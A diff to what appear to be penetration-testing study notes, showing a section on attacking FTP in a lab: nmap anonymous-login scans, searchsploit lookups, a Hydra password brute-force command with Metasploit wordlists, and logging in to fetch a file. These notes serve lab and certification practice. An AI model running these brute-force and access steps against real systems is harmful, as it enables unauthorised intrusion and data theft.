@@ -297,11 +297,11 @@ DO MIMIKATZ FIRST!
 
 ### Exploiting FTP
 - FTP port 21, file sharing
-- Can be anonymous access
+- Can be anonymous access: check: `nmap -sV 10.10.x.x --script=ftp-anon`
 - can be a brute force attack
 - Search for version vuln: `searchsploit versionOfFTP`
-1. After FTP found: try anonymous `ftp 10.10.x.x` 
-2. If not 1. : find namp scripts `ls -la /usr/share/nmap/scripts/ | grep ftp-* `
+1. After FTP found: try anonymous `ftp 10.10.x.x 21` 
+2. If not 1. : find namp scripts `ls -la /usr/share/nmap/scripts/ | grep ftp-* ` -> run nmap script: `nmap -sV 10.10.x.x --script=ftp-anon`
 3. Hydra bruteforce: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.x.x -t 4 ftp`
 4. login: `ftp 10.10.x.x` --> fill in username and password --> to download / show file `get secret.txt`
 
